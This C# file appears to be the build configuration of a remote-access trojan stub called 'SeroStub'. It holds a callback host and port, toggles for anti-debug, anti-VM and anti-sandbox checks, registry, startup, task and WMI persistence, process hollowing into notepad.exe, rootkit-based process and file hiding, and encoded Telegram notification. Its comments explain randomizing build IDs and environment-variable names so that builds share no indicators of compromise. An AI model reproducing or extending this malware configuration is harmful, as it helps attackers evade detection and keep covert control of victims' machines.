namespace SeroStub;

internal static class Config
{
    public static readonly string[] Hosts = new[] { "localhost" };
    public const int Port = 5555;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\05585d0d69f2483d9b9ebf72dca3003e";

    public const bool AntiDebug = false;
    public const bool AntiVM = false;
    public const bool AntiDetect = false;
    public const bool AntiSandbox = false;
    public const bool BlockCis = false;

    public const bool PersistRegistry = false;
    public const bool PersistStartup = false;
    public const bool PersistTask = false;
    public const bool PersistWmi = false;
    public const string PersistName = "we";

    public const bool AntiKill = false;
    public const bool EnableWatchdog = false;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "notepad.exe";

    public const string AuthKey = "tWMi3vNzAmgj0cqlzeEq9of00pe+fjR7";
    public const string CertHash = "07AAB3993AEFC4F6B065B04E1EDA9E20E14649C3852D7079A852B421534AB423";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "d3519c8d99b04c6ab10693f9044723ab";

    // Per-build env var names — randomized so no two builds share the same IoC strings
    public const string EnvKeyHollow        = "wcogeOWy8I";
    public const string EnvKeyPersistWorker = "JVRWxeugBH";
    public const string EnvKeyRelaunch      = "PbieraOypx";
    public const string EnvKeyExe           = "ub3SHOvqle";
    public const string EnvKeyGuardian      = "IQYS2rVOca";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = "BBB";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = "we";
    public const string HiddenFileName = "we.exe";

    public const bool EnableRootkit = false;
    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();
    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();

    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = false;
    public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
    public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
    public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
    public static readonly byte[] TelegramSfcSeed    = new byte[] { 207, 233, 56, 140, 137, 186, 139, 30, 50, 83, 211, 33, 219, 229, 2, 90, 62, 197, 64, 88, 133, 194, 125, 74, 118, 55, 69, 207, 31, 189, 104, 0 };
}
